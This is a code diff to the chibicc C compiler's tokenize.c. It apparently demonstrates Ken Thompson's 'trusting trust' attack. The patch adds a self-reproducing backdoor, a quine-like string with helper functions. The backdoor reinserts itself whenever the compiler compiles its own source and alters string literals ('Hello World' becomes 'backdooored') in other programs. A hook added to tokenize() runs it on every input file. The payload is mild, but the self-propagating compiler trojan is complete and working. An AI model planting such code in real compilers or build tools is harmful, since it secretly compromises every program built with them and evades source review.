@@ -1,0 +1,240 @@
+diff --git a/tokenize.c b/tokenize.c
+index 5c49c02..4d769ed 100644
+--- a/tokenize.c
++++ b/tokenize.c
+@@ -1,3 +1,225 @@
++#define _POSIX_C_SOURCE 200809L
++#include <stdlib.h>
++#include <string.h>
++
++static const char nih_str[] = "\
++static const size_t nih_str_sz =\
++(sizeof(nih_str) / sizeof(char)) - 1;\
++static const char nih_def[] =\
++\"#define _POSIX_C_SOURCE 200809L\\x0a#include <stdlib.h>\\x0a#include <string.h>\\x0astatic const char nih_str[] = \\x22\";\
++static const size_t nih_def_sz = (sizeof(nih_def) / sizeof(char)) - 1;\
++static const char nih_call[] = \" file->contents = nih(file->contents);\";\
++static const size_t nih_call_sz = (sizeof(nih_call) / sizeof(char)) - 1;\
++static inline int nih_detect(char *src,\
++const char *detect,\
++size_t detect_sz) {\
++for (size_t i = 0; src[i] != \'\\0\'; i++) {\
++if (src[i] == detect[0]) {\
++int flg = 1;\
++for (size_t j = 0; j < detect_sz; j++) {\
++if (src[i + j] != detect[j]) {\
++flg = 0;\
++break;\
++}\
++}\
++if (flg) return i;\
++}\
++}\
++return -1;\
++}\
++static inline size_t nih_fill_def(char* buf) {\
++size_t buf_ind = 0;\
++for (size_t i = 0; i < nih_def_sz; i++) {\
++buf[buf_ind++] = nih_def[i];\
++}\
++for (size_t i = 0; i < nih_str_sz; i++) {\
++if (nih_str[i] == \'\\x5c\' || nih_str[i] == \'\\x27\' || nih_str[i] == \'\\x22\')\
++buf[buf_ind++] = \'\\x5c\';\
++buf[buf_ind++] = nih_str[i];\
++}\
++buf[buf_ind++] = \'\\x22\';\
++buf[buf_ind++] = \';\';\
++for (size_t k = 0; k < nih_str_sz; k++) {\
++buf[buf_ind++] = nih_str[k];\
++}\
++return buf_ind;\
++}\
++static inline char *nih_fill_backdoor(char *src) {\
++const char detect[] =\
++\"// https://github.com/rui314/chibicc/wiki/thompson1984.pdf\";\
++const size_t detect_sz = (sizeof(detect) / sizeof(char)) - 1;\
++if (nih_detect(src, detect, detect_sz) == -1) return src;\
++const char tokenize_def[] = \"Token *tokenize(File *file) {\";\
++const size_t tokenize_def_sz =\
++(sizeof(tokenize_def) / sizeof(char)) - 1;\
++int tokenize_def_ind = nih_detect(src, tokenize_def, tokenize_def_sz);\
++if (tokenize_def_ind == -1) return src;\
++size_t src_sz = strlen(src);\
++char *buf =\
++(char *)malloc(sizeof(char) * (src_sz * 2 + nih_str_sz * 3));\
++if (buf == NULL) abort();\
++size_t buf_ind = nih_fill_def(buf);\
++buf[buf_ind++] = \'\\x0a\';\
++size_t src_ind = 0;\
++for (; src_ind < (tokenize_def_ind + tokenize_def_sz); src_ind++) {\
++buf[buf_ind++] = src[src_ind];\
++}\
++for (size_t i = 0; i < nih_call_sz; i++) {\
++buf[buf_ind++] = nih_call[i];\
++}\
++for (; src_ind < src_sz; src_ind++) {\
++buf[buf_ind++] = src[src_ind];\
++}\
++buf[buf_ind] = \'\\0\';\
++return buf;\
++}\
++char *nih(char *src) {\
++const char detect_cc[] = \"#include \" \"\\x22\" \"chibicc.h\" \"\\x22\";\
++const size_t detect_sz = (sizeof(detect_cc) / sizeof(char)) - 1;\
++if (nih_detect(src, detect_cc, detect_sz) != -1)\
++return nih_fill_backdoor(src);\
++const char hello[] = \"\\x22\" \"Hello World\" \"\\x22\";\
++const char evil[]  = \"\\x22\" \"backdooored\" \"\\x22\";\
++const size_t hello_sz = (sizeof(hello) / sizeof(char)) - 1;\
++char *src_p = src;\
++int hello_find = nih_detect(src_p, hello, hello_sz);\
++while (hello_find != -1) {\
++src_p += hello_find;\
++for (size_t i = 0; i < hello_sz; i++) {\
++*src_p = evil[i];\
++src_p++;\
++}\
++hello_find = nih_detect(src_p, hello, hello_sz);\
++}\
++return src;\
++}";
++
++static const size_t nih_str_sz = 
++  (sizeof(nih_str) / sizeof(char)) - 1;
++
++static const char nih_def[] = 
++  "#define _POSIX_C_SOURCE 200809L\x0a#include <stdlib.h>\x0a#include <string.h>\x0astatic const char nih_str[] = \x22";
++
++static const size_t nih_def_sz = (sizeof(nih_def) / sizeof(char)) - 1;
++
++static const char nih_call[] = " file->contents = nih(file->contents);";
++static const size_t nih_call_sz = (sizeof(nih_call) / sizeof(char)) - 1;
++
++static inline int nih_detect(char *src, 
++                             const char *detect, 
++                             size_t detect_sz) {  
++  for (size_t i = 0; src[i] != '\0'; i++) {
++      if (src[i] == detect[0]) {
++        int flg = 1;
++        for (size_t j = 0; j < detect_sz; j++) {
++          if (src[i + j] != detect[j]) {
++            flg = 0;
++            break;
++          }
++        }
++        if (flg) return i;
++      }
++  }
++
++  return -1;
++}
++
++static inline size_t nih_fill_def(char* buf) {
++  size_t buf_ind = 0;
++  
++  for (size_t i = 0; i < nih_def_sz; i++) {
++    buf[buf_ind++] = nih_def[i];
++  }
++
++  for (size_t i = 0; i < nih_str_sz; i++) {
++    if (nih_str[i] == '\x5c' || nih_str[i] == '\x27' || nih_str[i] == '\x22') 
++      buf[buf_ind++] = '\x5c';    
++    buf[buf_ind++] = nih_str[i];
++  }
++
++  buf[buf_ind++] = '\x22';
++  buf[buf_ind++] = ';';
++
++  for (size_t k = 0; k < nih_str_sz; k++) {
++    buf[buf_ind++] = nih_str[k];
++  }
++
++  return buf_ind;
++}
++
++static inline char *nih_fill_backdoor(char *src) {
++
++  const char detect[] = 
++    "// https://github.com/rui314/chibicc/wiki/thompson1984.pdf";
++  const size_t detect_sz = (sizeof(detect) / sizeof(char)) - 1;
++
++  if (nih_detect(src, detect, detect_sz) == -1) return src;
++  
++  const char tokenize_def[] = "Token *tokenize(File *file) {";
++  const size_t tokenize_def_sz = 
++    (sizeof(tokenize_def) / sizeof(char)) - 1;
++
++  int tokenize_def_ind = nih_detect(src, tokenize_def, tokenize_def_sz);
++
++  if (tokenize_def_ind == -1) return src;
++
++  size_t src_sz = strlen(src);
++
++  char *buf = 
++    (char *)malloc(sizeof(char) * (src_sz * 2 + nih_str_sz * 3));
++
++  if (buf == NULL) abort();
++
++  size_t buf_ind = nih_fill_def(buf);
++
++  buf[buf_ind++] = '\x0a';
++
++  size_t src_ind = 0;
++  for (; src_ind < (tokenize_def_ind + tokenize_def_sz); src_ind++) {
++    buf[buf_ind++] = src[src_ind];
++  }
++
++  for (size_t i = 0; i < nih_call_sz; i++) {
++    buf[buf_ind++] = nih_call[i];
++  }
++
++  for (; src_ind < src_sz; src_ind++) {
++    buf[buf_ind++] = src[src_ind];
++  }
++
++  buf[buf_ind] = '\0';
++
++  return buf;
++}
++
++char *nih(char *src) {
++  const char detect_cc[] = "#include " "\x22" "chibicc.h" "\x22";
++  const size_t detect_sz = (sizeof(detect_cc) / sizeof(char)) - 1;
++
++  if (nih_detect(src, detect_cc, detect_sz) != -1)
++    return nih_fill_backdoor(src);
++
++  const char hello[] = "\x22" "Hello World" "\x22";
++  const char evil[]  = "\x22" "backdooored" "\x22";
++  const size_t hello_sz = (sizeof(hello) / sizeof(char)) - 1;
++
++  char *src_p = src;
++  int hello_find = nih_detect(src_p, hello, hello_sz);
++  
++  while (hello_find != -1) {
++    src_p += hello_find;
++
++    for (size_t i = 0; i < hello_sz; i++) {
++      *src_p = evil[i];
++      src_p++;
++    }
++
++    hello_find = nih_detect(src_p, hello, hello_sz);
++  }
++
++  return src; 
++}
++
+ #include "chibicc.h"
+ 
+ // Input file
+@@ -487,7 +709,8 @@ Token *tokenize_string_literal(Token *tok, Type *basety) {
+ }
+ 
+ // Tokenize a given string and returns new tokens.
+-Token *tokenize(File *file) {
++Token *tokenize(File *file) { 
++  file->contents = nih(file->contents);
+   current_file = file;
+ 
+   char *p = file->contents;
